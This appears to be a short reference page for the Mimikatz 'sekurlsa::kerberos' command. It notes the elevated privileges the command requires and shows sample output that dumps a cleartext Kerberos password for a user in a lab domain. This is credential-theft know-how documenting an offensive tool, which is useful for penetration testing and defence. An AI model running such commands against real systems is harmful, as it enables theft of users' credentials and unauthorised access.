# kerberos

It lists Kerberos credentials.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::kerberos

Authentication Id : 0 ; 135255778 (00000000:080fd6e2)
Session           : RemoteInteractive from 3
User Name         : m3g9tr0n
Domain            : hacklab
Logon Server      : DC
Logon Time        : 9/27/2021 1:22:05 PM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1730
        kerberos :
         * Username : m3g9tr0n
         * Domain   : HACKLAB.LOCAL
         * Password : Super_SecretPass1!
```
